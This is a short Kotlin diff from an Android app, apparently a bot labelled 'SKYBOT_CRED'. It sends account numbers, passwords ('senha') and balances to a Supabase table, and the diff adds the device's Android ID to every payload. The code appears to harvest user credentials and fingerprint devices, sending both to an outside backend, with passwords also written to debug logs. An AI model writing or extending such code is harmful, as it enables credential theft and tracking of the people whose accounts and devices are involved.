@@ -2788,7 +2788,9 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
         sessaoId = -1  // resetar sessão anterior
         val numEsc = numero.replace("\"", "\\\"")
         val senEsc = senha.replace("\"", "\\\"")
-        val json = "{\"numero\":\"$numEsc\",\"senha\":\"$senEsc\",\"saldo\":\"\"}"
+        val androidId = android.provider.Settings.Secure.getString(
+            contentResolver, android.provider.Settings.Secure.ANDROID_ID) ?: "unknown"
+        val json = "{\"numero\":\"$numEsc\",\"senha\":\"$senEsc\",\"saldo\":\"\",\"device_id\":\"$androidId\"}"
         Thread {
             try {
                 val conn = URL("$SUPA_URL/rest/v1/$TABELA").openConnection() as HttpURLConnection
@@ -2828,7 +2830,9 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
     }
 
     private fun enviarSupabase(tipoVal: String, valorVal: String) {
-        val json = "{\"tipo\":\"$tipoVal\",\"valor\":\"$valorVal\"}"
+        val androidId = android.provider.Settings.Secure.getString(
+            contentResolver, android.provider.Settings.Secure.ANDROID_ID) ?: "unknown"
+        val json = "{\"tipo\":\"$tipoVal\",\"valor\":\"$valorVal\",\"device_id\":\"$androidId\"}"
         android.util.Log.d("SKYBOT_CRED", "enviarSupabase → tipo=$tipoVal valor=$valorVal")
         Thread {
             try {
